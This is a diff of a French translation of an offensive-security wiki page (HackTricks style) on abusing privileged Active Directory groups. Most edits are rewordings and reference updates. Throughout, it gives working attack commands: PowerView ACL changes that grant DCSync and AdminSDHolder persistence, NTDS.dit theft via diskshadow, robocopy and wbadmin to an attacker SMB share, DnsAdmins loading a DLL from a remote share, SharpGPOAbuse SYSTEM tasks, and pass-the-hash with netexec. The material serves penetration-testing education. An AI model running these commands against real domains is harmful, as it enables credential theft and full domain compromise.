@@ -20,13 +20,13 @@ L’ajout de nouveaux utilisateurs est autorisé, tout comme la connexion locale
 
 ## Groupe AdminSDHolder
 
-La **Access Control List (ACL)** du groupe **AdminSDHolder** est cruciale, car elle définit les permissions de tous les « groupes protégés » au sein d’Active Directory, y compris les groupes disposant de privilèges élevés. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.
+L’Access Control List (ACL) du groupe **AdminSDHolder** est essentielle, car elle définit les permissions pour tous les « groupes protégés » au sein d’Active Directory, y compris les groupes disposant de privilèges élevés. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.
 
-Un attaquant pourrait exploiter ce mécanisme en modifiant l’ACL du groupe **AdminSDHolder** afin d’accorder des permissions complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur un contrôle total sur tous les groupes protégés. Si les permissions de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l’heure en raison de la conception du système.<sup>[[14]](#references)</sup>
+Un attaquant pourrait exploiter cela en modifiant l’ACL du groupe **AdminSDHolder** afin d’accorder des permissions complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur le contrôle total de tous les groupes protégés. Si les permissions de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l’heure en raison de la conception du système.<sup>[[14]](#references)</sup>
 
-La documentation récente de Windows Server considère toujours plusieurs groupes d’opérateurs intégrés comme des objets **protégés** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Le processus **SDProp** s’exécute par défaut toutes les 60 minutes sur le **PDC Emulator**, définit `adminCount=1` et désactive l’héritage sur les objets protégés. Cela est utile à la fois pour la persistance et pour rechercher les utilisateurs privilégiés obsolètes qui ont été supprimés d’un groupe protégé, mais qui conservent toujours l’ACL sans héritage.<sup>[[12]](#references)</sup>
+La documentation récente de Windows Server considère toujours plusieurs groupes d’opérateurs intégrés comme des objets **protégés** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Le processus **SDProp** s’exécute sur le **PDC Emulator** toutes les 60 minutes par défaut, définit `adminCount=1` et désactive l’héritage sur les objets protégés. Cela est utile à la fois pour la persistance et pour rechercher les utilisateurs privilégiés obsolètes qui ont été supprimés d’un groupe protégé, mais qui conservent toujours l’ACL sans héritage.<sup>[[12]](#references)</sup>
 
-Les commandes permettant de vérifier les membres et de modifier les permissions incluent :
+Les commandes permettant d’examiner les membres et de modifier les permissions sont les suivantes :
 ```bash
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
@@ -44,31 +44,31 @@ Pour plus de détails, consultez [ired.team](https://ired.team/offensive-securit
 
 ## Corbeille AD
 
-L'appartenance à ce groupe permet de lire les objets Active Directory supprimés, ce qui peut révéler des informations sensibles :
+L’appartenance à ce groupe permet de lire les objets Active Directory supprimés, ce qui peut révéler des informations sensibles :
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-Cela est utile pour **retrouver d’anciens chemins de privilèges**. Les objets supprimés peuvent toujours exposer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, d’anciens SPN ou le DN d’un groupe privilégié supprimé, qui peut ensuite être restauré par un autre opérateur.
+Cela est utile pour **reconstituer d’anciens chemins de privilèges**. Les objets supprimés peuvent toujours révéler `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, d’anciens SPN ou le DN d’un groupe privilégié supprimé qui pourra ensuite être restauré par un autre opérateur.
 ```powershell
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
 -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
 Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
 ```
-### Accès au Contrôleur de domaine
+### Accès au contrôleur de domaine
 
-L'accès aux fichiers du DC est restreint, sauf si l'utilisateur fait partie du groupe `Server Operators`, ce qui modifie le niveau d'accès.
+L’accès aux fichiers du DC est restreint, sauf si l’utilisateur fait partie du groupe `Server Operators`, ce qui modifie le niveau d’accès.
 
-### Escalade de privilèges
+### Élévation de privilèges
 
-Avec `PsService` ou `sc` de Sysinternals, il est possible d'inspecter et de modifier les permissions des services. Le groupe `Server Operators`, par exemple, dispose d'un contrôle total sur certains services, ce qui permet d'exécuter des commandes arbitraires et de réaliser une escalade de privilèges :<sup>[[1]](#references)</sup>
+Avec `PsService` ou `sc` de Sysinternals, il est possible d’inspecter et de modifier les permissions des services. Le groupe `Server Operators`, par exemple, dispose d’un contrôle total sur certains services, ce qui permet l’exécution de commandes arbitraires et l’élévation de privilèges :<sup>[[1]](#references)</sup>
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-Cette commande révèle que les membres de `Server Operators` disposent d’un accès complet, ce qui permet de manipuler les services afin d’obtenir des privilèges élevés.
+Cette commande révèle que les membres de `Server Operators` disposent d'un accès complet, permettant de manipuler les services afin d'obtenir des privilèges élevés.
 
 ## Backup Operators
 
-L’appartenance au groupe `Backup Operators` permet d’accéder au système de fichiers de `DC01` grâce aux privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent de parcourir les dossiers, de les répertorier et de copier des fichiers, même sans autorisations explicites, en utilisant l’indicateur `FILE_FLAG_BACKUP_SEMANTICS`. L’utilisation de scripts spécifiques est nécessaire pour ce processus.<sup>[[1]](#references)</sup>
+L'appartenance au groupe `Backup Operators` fournit un accès au système de fichiers de `DC01` grâce aux privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent de parcourir les dossiers, de les répertorier et de copier des fichiers, même sans autorisations explicites, en utilisant l'indicateur `FILE_FLAG_BACKUP_SEMANTICS`. L'utilisation de scripts spécifiques est nécessaire pour ce processus.<sup>[[1]](#references)</sup>
 
 Pour répertorier les membres du groupe, exécutez :
 ```bash
@@ -83,7 +83,7 @@ Pour exploiter ces privilèges localement, les étapes suivantes sont utilisées
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-2. Activer et vérifier `SeBackupPrivilege` :
+2. Activez et vérifiez `SeBackupPrivilege` :
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
@@ -99,7 +99,7 @@ Un accès direct au système de fichiers du Domain Controller permet de voler la
 
 #### Utilisation de diskshadow.exe
 
-1. Créer une copie instantanée du lecteur `C` :
+1. Créez une copie shadow du lecteur `C` :
 ```cmd
 diskshadow.exe
 set verbose on
@@ -112,11 +112,11 @@ expose %cdrive% F:
 end backup
 exit
 ```
-2. Copiez `NTDS.dit` depuis la shadow copy :
+2. Copier `NTDS.dit` depuis la shadow copy :
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-Sinon, utilisez `robocopy` pour copier des fichiers :
+Vous pouvez également utiliser `robocopy` pour copier des fichiers :
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
@@ -139,7 +139,7 @@ netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec 
 ```
 #### Utiliser wbadmin.exe
 
-1. Configurez le système de fichiers NTFS pour le serveur SMB sur la machine de l’attaquant et mettez en cache les identifiants SMB sur la machine cible.
+1. Configurez un système de fichiers NTFS pour le serveur SMB sur la machine de l’attaquant et mettez en cache les identifiants SMB sur la machine cible.
 2. Utilisez `wbadmin.exe` pour effectuer une sauvegarde du système et extraire `NTDS.dit` :
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -152,7 +152,7 @@ Pour une démonstration pratique, consultez [DEMO VIDEO WITH IPPSEC](https://www
 
 ## DnsAdmins
 
-Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec les privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des contrôleurs de domaine. Cette capacité offre un potentiel d’exploitation important.
+Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec des privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des Domain Controllers. Cette fonctionnalité offre un potentiel d’exploitation important.
 
 Pour lister les membres du groupe DnsAdmins, utilisez :
 ```bash
@@ -161,9 +161,9 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ### Exécuter une DLL arbitraire (CVE‑2021‑40469)
 
 > [!NOTE]
-> Cette vulnérabilité permet l’exécution de code arbitraire avec des privilèges SYSTEM dans le service DNS (généralement sur les DC). Ce problème a été corrigé en 2021.
+> Cette vulnérabilité permet l’exécution de code arbitraire avec des privilèges SYSTEM dans le service DNS (généralement sur les DCs). Ce problème a été corrigé en 2021.
 
-Les membres peuvent forcer le serveur DNS à charger une DLL arbitraire (localement ou depuis un partage distant) à l’aide de commandes telles que :
+Les membres peuvent faire charger au serveur DNS une DLL arbitraire (localement ou depuis un partage distant) à l’aide de commandes telles que :
 ```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -191,18 +191,18 @@ Le redémarrage du service DNS (qui peut nécessiter des autorisations suppléme
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Pour plus de détails sur ce vecteur d’attaque, consultez ired.team.
+Pour plus de détails sur ce vecteur d'attaque, consultez ired.team.
 
 #### Mimilib.dll
 
-Il est également possible d’utiliser mimilib.dll pour l’exécution de commandes, en le modifiant afin d’exécuter des commandes spécifiques ou des reverse shells. [Consultez cet article](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d’informations.<sup>[[15]](#references)</sup>
+Il est également possible d'utiliser mimilib.dll pour l'exécution de commandes, en le modifiant afin d'exécuter des commandes spécifiques ou des reverse shells. [Consultez cet article](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d'informations.<sup>[[15]](#references)</sup>
 
-### WPAD Record for MitM
+### WPAD Record for MitM
 
-Les membres de DnsAdmins peuvent manipuler les enregistrements DNS afin d’effectuer des attaques Man-in-the-Middle (MitM), en créant un enregistrement WPAD après avoir désactivé la global query block list. Des outils comme Responder ou Inveigh peuvent être utilisés pour réaliser du spoofing et capturer le trafic réseau.
+Les DnsAdmins peuvent manipuler les enregistrements DNS afin d'effectuer des attaques Man-in-the-Middle (MitM) en créant un enregistrement WPAD après avoir désactivé la global query block list. Des outils tels que Responder ou Inveigh peuvent être utilisés pour effectuer du spoofing et capturer le trafic réseau.
 
 ### Event Log Readers
-Les membres peuvent accéder aux journaux d’événements et potentiellement y trouver des informations sensibles, telles que des mots de passe en clair ou des détails sur l’exécution de commandes :
+Les membres peuvent accéder aux journaux d'événements et potentiellement trouver des informations sensibles, telles que des mots de passe en clair ou des détails d'exécution de commandes :
 ```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -210,25 +210,25 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ```
 ## Exchange Windows Permissions
 
-Ce groupe peut modifier les DACL sur l’objet du domaine, ce qui peut permettre d’accorder des privilèges DCSync. Les techniques d’escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
+Ce groupe peut modifier les DACL sur l’objet de domaine, ce qui peut permettre d’accorder des privilèges DCSync. Les techniques d’escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
 ```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
-Si vous pouvez agir en tant que membre de ce groupe, l’abus classique consiste à accorder à un principal contrôlé par l’attaquant les droits de réplication nécessaires à [DCSync](dcsync.md) :
+Si vous pouvez agir en tant que membre de ce groupe, l’abus classique consiste à accorder à un principal contrôlé par l’attaquant les droits de réplication nécessaires à [DCSync](dcsync.md) :
 ```bash
 Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
 Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
 ```
-Historiquement, **PrivExchange** combinait l'accès aux boîtes aux lettres, l'authentification Exchange forcée et le LDAP relay pour obtenir ce même primitive. Même lorsque cette voie de relay est mitigée, l'appartenance directe à `Exchange Windows Permissions` ou le contrôle d'un serveur Exchange reste une voie à haut potentiel vers les droits de réplication du domaine.
+Historiquement, **PrivExchange** enchaînait l’accès aux boîtes aux lettres, l’authentification Exchange forcée et le relay LDAP pour obtenir ce même primitive. Même lorsque cette voie de relay est corrigée, l’appartenance directe à `Exchange Windows Permissions` ou le contrôle d’un serveur Exchange reste une voie à forte valeur vers les droits de réplication du domaine.
 
 ## Hyper-V Administrators
 
-Les membres de **Hyper-V Administrators** disposent d'un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle de Domain Controllers virtualisés. Cela inclut le clonage de DCs actifs et l'extraction de hashes NTLM depuis le fichier NTDS.dit.
+Les membres de Hyper-V Administrators disposent d’un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle de Domain Controllers virtualisés. Cela inclut le clonage de DC actifs et l’extraction de hashes NTLM depuis le fichier NTDS.dit.
 
-### Exemple d'exploitation
+### Exemple d’exploitation
 
-L'abus pratique consiste généralement à obtenir un **accès hors ligne aux disques/checkpoints des DCs**, plutôt qu'à utiliser d'anciennes techniques de LPE au niveau de l'hôte. Avec un accès à l'hôte Hyper-V, un operator peut créer un checkpoint ou exporter un Domain Controller virtualisé, monter le VHDX et extraire `NTDS.dit`, `SYSTEM` ainsi que d'autres secrets sans interagir avec LSASS à l'intérieur du guest :
+L’abus pratique consiste généralement à obtenir un **accès offline aux disques/checkpoints des DC** plutôt qu’à utiliser d’anciennes techniques de LPE au niveau de l’hôte. Avec un accès à l’hôte Hyper-V, un opérateur peut créer un checkpoint ou exporter un Domain Controller virtualisé, monter le VHDX et extraire `NTDS.dit`, `SYSTEM` ainsi que d’autres secrets sans interagir avec LSASS à l’intérieur de la machine invitée :
 ```bash
 # Host-side enumeration
 Get-VM
@@ -241,85 +241,86 @@ Depuis là, réutilisez le workflow `Backup Operators` pour copier `Windows\NTDS
 
 ## Group Policy Creators Owners
 
-Ce groupe permet à ses membres de créer des Group Policies dans le domaine. Cependant, ses membres ne peuvent pas appliquer de stratégies de groupe aux utilisateurs ou aux groupes, ni modifier des GPO existantes.
+Ce groupe permet à ses membres de créer des stratégies de groupe dans le domaine. Cependant, ses membres ne peuvent pas appliquer de stratégies de groupe aux utilisateurs ou aux groupes, ni modifier les GPO existantes.
 
-La nuance importante est que le **creator devient propriétaire de la nouvelle GPO** et obtient généralement suffisamment de droits pour la modifier par la suite. Cela signifie que ce groupe est intéressant lorsque vous pouvez :
+La nuance importante est que le **créateur devient propriétaire de la nouvelle GPO** et obtient généralement suffisamment de droits pour la modifier par la suite. Cela signifie que ce groupe est intéressant lorsque vous pouvez :
 
-- créer une GPO malveillante et convaincre un administrateur de la lier à une OU ou à un domaine cible
+- créer une GPO malveillante et convaincre un administrateur de la lier à une OU ou un domaine cible
 - modifier une GPO que vous avez créée et qui est déjà liée à un emplacement utile
-- exploiter un autre droit délégué permettant de lier des GPO, tandis que ce groupe vous fournit les droits de modification
+- exploiter un autre droit délégué permettant de lier des GPO, tandis que ce groupe vous donne les droits de modification
 
-En pratique, l’abus consiste généralement à ajouter une **Immediate Task**, un **startup script**, une **adhésion au groupe des administrateurs locaux** ou une modification de l’**attribution des user rights** via les fichiers de stratégie soutenus par SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
+En pratique, l’abus consiste généralement à ajouter une **Immediate Task**, un **startup script**, une **local admin membership** ou une modification de **user rights assignment** via les fichiers de stratégie stockés dans SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
 ```bash
 # Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
 SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
 ```
-Si vous modifiez manuellement la GPO via `SYSVOL`, n'oubliez pas que cette modification ne suffit pas à elle seule : `versionNumber`, `GPT.ini` et parfois `gPCMachineExtensionNames` doivent également être mis à jour, sinon les clients ignoreront l'actualisation de la stratégie.<sup>[[9]](#references)</sup>
+Si vous modifiez manuellement la GPO via `SYSVOL`, n'oubliez pas que cette modification ne suffit pas à elle seule : `versionNumber`, `GPT.ini` et parfois `gPCMachineExtensionNames` doivent également être mis à jour, sinon les clients ignoreront l'actualisation de la policy.<sup>[[9]](#references)</sup>
 
 ## Organization Management
 
-Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial nommé **Organization Management** dispose de capacités importantes. Ce groupe est privilégié pour **accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et conserve le **contrôle total sur l'**unité organisationnelle (OU) **'Microsoft Exchange Security Groups'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour effectuer une élévation de privilèges.
+Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial connu sous le nom de **Organization Management** dispose de capacités importantes. Ce groupe est privilégié pour **accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et dispose d'un **contrôle total sur** l'Organizational Unit (OU) **`Microsoft Exchange Security Groups`**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour effectuer une privilege escalation.
 
 ### Exploitation des privilèges et commandes
 
 #### Print Operators
 
-Les membres du groupe **Print Operators** disposent de plusieurs privilèges, notamment **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un Domain Controller**, de l'arrêter et de gérer les imprimantes. Pour exploiter ces privilèges, notamment si **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner le User Account Control (UAC).<sup>[[1]](#references)</sup>
+Les membres du groupe **Print Operators** disposent de plusieurs privilèges, notamment **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un Domain Controller**, de l'arrêter et de gérer les imprimantes. Pour exploiter ces privilèges, en particulier si **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non elevated, il est nécessaire de contourner User Account Control (UAC).<sup>[[1]](#references)</sup>
 
 Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée :
 ```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Sur les Contrôleurs de domaine, ce groupe est dangereux, car la stratégie par défaut des Contrôleurs de domaine accorde **`SeLoadDriverPrivilege`** à `Print Operators`. Si vous obtenez un token élevé pour un membre de ce groupe, vous pouvez activer le privilège et charger un pilote signé mais vulnérable afin de passer au kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Pour plus de détails sur la gestion des tokens, consultez [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).
+Sur les contrôleurs de domaine, ce groupe est dangereux, car la stratégie par défaut des contrôleurs de domaine accorde **`SeLoadDriverPrivilege`** à `Print Operators`. Si vous obtenez un token élevé pour un membre de ce groupe, vous pouvez activer le privilège et charger un driver signé, mais vulnérable, afin d’atteindre le kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Pour plus de détails sur la gestion des tokens, consultez [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).
 
 #### Remote Desktop Users
 
-Les membres de ce groupe se voient accorder l’accès aux PC via le Remote Desktop Protocol (RDP). Des commandes PowerShell sont disponibles pour énumérer ces membres :
+Les membres de ce groupe obtiennent un accès aux ordinateurs via le protocole Remote Desktop (RDP). Des commandes PowerShell permettent de recenser ces membres :
 ```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-Further insights into exploiting RDP can be found in dedicated pentesting resources.
+Des informations supplémentaires sur l’exploitation de RDP sont disponibles dans des ressources dédiées au pentesting.
 
-#### Remote Management Users
+#### Utilisateurs de la gestion à distance
 
-Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L'énumération de ces membres s'effectue via :
+Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L’énumération de ces membres s’effectue à l’aide de :
 ```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Pour les techniques d’exploitation liées à **WinRM**, il convient de consulter la documentation spécifique.
+Pour les techniques d'exploitation liées à **WinRM**, il convient de consulter la documentation spécifique.
 
 #### Server Operators
 
-Ce groupe dispose d’autorisations lui permettant d’effectuer diverses configurations sur les contrôleurs de domaine, notamment les privilèges de sauvegarde et de restauration, la modification de l’heure système et l’arrêt du système.<sup>[[1]](#references)</sup> Pour énumérer ses membres, la commande suivante est fournie :
+Ce groupe dispose des autorisations nécessaires pour effectuer diverses configurations sur les contrôleurs de domaine, notamment les privilèges de sauvegarde et de restauration, la modification de l'heure système et l'arrêt du système.<sup>[[1]](#references)</sup> Pour énumérer ses membres, la commande fournie est la suivante :
 ```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-Sur les Domain Controllers, `Server Operators` héritent généralement de suffisamment de droits pour **reconfigurer ou démarrer/arrêter des services** et reçoivent également `SeBackupPrivilege`/`SeRestorePrivilege` via la stratégie par défaut des DC. En pratique, cela en fait un pont entre **l’abus du contrôle des services** et **l’extraction de NTDS** :
+Sur les Contrôleurs de domaine, `Server Operators` héritent généralement de suffisamment de droits pour **reconfigurer ou démarrer/arrêter des services** et reçoivent également `SeBackupPrivilege`/`SeRestorePrivilege` via la stratégie DC par défaut. En pratique, cela en fait un pont entre **l’abus du contrôle des services** et **l’extraction de NTDS** :
 ```cmd
 sc.exe \\dc01 query
 sc.exe \\dc01 qc <service>
 .\PsService.exe security <service>
 ```
-Si une ACL de service accorde à ce groupe les droits de modification/de démarrage, pointez le service vers une commande arbitraire, démarrez-le en tant que `LocalSystem`, puis restaurez le `binPath` d’origine. Si le contrôle des services est verrouillé, utilisez plutôt les techniques de `Backup Operators` ci-dessus pour copier `NTDS.dit`.
+Si une ACL de service accorde à ce groupe les droits de modification/démarrage, faites pointer le service vers une commande arbitraire, démarrez-le en tant que `LocalSystem`, puis restaurez le `binPath` d’origine. Si le contrôle des services est verrouillé, utilisez plutôt les techniques de `Backup Operators` ci-dessus pour copier `NTDS.dit`.
 
-## Références
+## References
 
 - [1] [ired.team – Comptes privilégiés et privilèges de token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
-- [2] [Tarlogic – Exploitation de SeLoadDriverPrivilege pour l’élévation de privilèges](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
-- [3] [harmj0y – Exploitation des permissions GPO](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
-- [4] [rastamouse – Exploitation des GPO - Partie 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
+- [2] [Tarlogic – Abus de SeLoadDriverPrivilege pour l’escalade de privilèges](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+- [3] [harmj0y – Abus des permissions GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
+- [4] [rastamouse – Abus de GPO, partie 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
 - [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
 - [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
 - [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
 - [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
-- [9] [SpecterOps – Guide du Red Teamer sur les GPO et les OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
-- [10] [Undocumented NT Internals – Fonction NtLoadDriver](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
+- [9] [SpecterOps – Guide d’un Red Teamer sur les GPO et les OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
+- [10] [Microsoft Learn – Fonction ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
 - [11] [HTB: Baby — LDAP anonyme → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 - [12] [Microsoft Learn – Annexe C : comptes et groupes protégés dans Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
 - [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
-- [14] [ired.team – Comment exploiter et backdoorer AdminSDHolder pour obtenir une persistance de Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
-- [15] [Lab of a Penetration Tester – Exploitation du privilège DnsAdmins pour l’élévation dans Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory)
-
+- [14] [ired.team – Comment abuser d’AdminSDHolder et le backdoorer pour obtenir une persistence de Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+- [15] [Lab of a Penetration Tester – Abus du privilège DnsAdmins pour l’escalade dans Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+- [16] [BloodHound – Informations sur l’abus de l’arête GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
+- [17] [Undocumented NT Internals – Fonction NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 {{#include ../../banners/hacktricks-training.md}}
